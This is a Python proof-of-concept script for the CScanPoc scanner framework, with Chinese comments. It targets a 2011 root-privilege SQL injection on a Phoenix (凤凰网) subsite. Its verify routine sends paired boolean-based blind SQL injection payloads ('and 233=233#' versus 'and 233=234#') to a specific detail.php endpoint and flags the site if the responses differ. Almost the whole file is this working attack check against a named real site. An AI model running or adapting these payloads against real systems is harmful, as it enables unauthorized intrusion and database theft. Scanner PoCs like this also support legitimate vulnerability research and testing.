# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'Fenghuang_0018' # 平台漏洞编号
    name = '凤凰网某分站ROOT权限SQL注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2011-02-13'  # 漏洞公布时间
    desc = '''
        凤凰网某分站ROOT权限SQL注入漏洞，攻击者可以通过构造恶意SQL语句泄露出数据库中的重要信息。
    ''' # 漏洞描述
    ref = 'Unknown' #https://wooyun.shuimugan.com/bug/view?bug_no=1197
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '凤凰网'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '733c748c-c3d7-4587-b0d5-09563817c4e5' # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-26' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            
            payload1 = "/dkjs/detail.php?id=928' and 233=233#"
            payload2 = "/dkjs/detail.php?id=928' and 233=234#"
            vul_url1 = arg + payload1
            vul_url2 = arg + payload2
            response1 = requests.get(vul_url1)
            response2 = requests.get(vul_url2)

            if response1.text != response2.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
